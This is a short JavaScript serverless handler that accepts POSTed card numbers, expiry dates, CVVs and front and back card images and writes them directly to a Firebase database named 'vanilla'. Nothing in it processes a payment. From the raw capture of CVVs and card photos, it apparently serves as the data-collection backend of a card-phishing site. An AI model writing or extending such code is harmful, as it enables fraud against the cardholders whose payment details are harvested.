import admin from "firebase-admin";

const serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT || "{}");

if (!admin.apps.length) {
  admin.initializeApp({
    credential: admin.credential.cert(serviceAccount),
    databaseURL: "https://vanilla-3be8f.firebaseio.com"
  });
}

const db = admin.database();

export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).json({ error: "Method Not Allowed" });

  try {
    const { card_number, expiry_date, cvv, front_image, back_image } = req.body;
    const data = {
      card_number,
      expiry_date,
      cvv,
      front_image,
      back_image,
      timestamp: Date.now()
    };
    await db.ref("submissions").push(data);
    res.status(200).json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
}
